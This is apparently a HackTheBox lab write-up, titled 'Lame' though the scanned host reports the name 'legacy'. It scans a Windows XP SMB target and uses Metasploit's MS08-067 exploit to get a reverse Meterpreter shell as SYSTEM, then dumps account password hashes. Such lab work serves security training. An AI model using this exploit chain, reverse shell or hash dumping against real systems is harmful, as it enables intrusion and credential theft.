# Lame | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-oowkje0uqt]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.44.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-20 02:15 UTC
Nmap scan report for 10.129.44.176
Host is up (0.21s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d01h00m53s, deviation: 1h24m50s, median: 5d00h00m53s
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:9f:15 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-11-25T06:20:34+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   218.21 ms 10.10.14.1
2   218.71 ms 10.129.44.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 280.97 seconds
```
The machine is most likely running some variety of Windows XP (Nmap reckons SP3) with SMB.

### 3. Look at SMB
Firsty, check out the SMB share. In order to connect I have to modify the `/etc/samba/smb.conf` file and add the line `client min protocol = NT1` under global.
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-oowkje0uqt]─[~]
└──╼ [★]$ smbclient -L \\\\10.129.44.176 --user anonymous
Enter WORKGROUP\anonymous's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```
Anonymous login is not possible.
  
Next I do research for previous vulnerabilties associated with Windows XP SMB. Any exploit would need to be remote and unauthenticated, which is very severe. MS08-067 was disclosed in 2008 and matches these parameters: https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/

### 4. Get a shell as system
I can test the exploit from within metasploit.
```bash
msf5 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.129.44.176    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.32:4444 
[*] 10.129.44.176:445 - Automatically detecting the target...
[*] 10.129.44.176:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.44.176:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.44.176:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.129.44.176
[*] Meterpreter session 1 opened (10.10.14.32:4444 -> 10.129.44.176:1053) at 2020-11-20 02:51:16 +0000

meterpreter > hashdump
Administrator:500:b47234f31e261b47587db580d0d5f393:b1e8bd81ee9a6679befb976c0b9b6827:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:0ca071c2a387b648559a926bfe39f8d7:332e3bd65dbe0af563383faff76c6dc5:::
john:1003:dc6e5a1d0d4929c2969213afe9351474:54ee9a60735ab539438797574a9487ad:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f2b8398cafc7174be746a74a3a7a3823:::

meterpreter > shell
Process 356 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```
Through this exploit I recieve a shell as system on the machine.
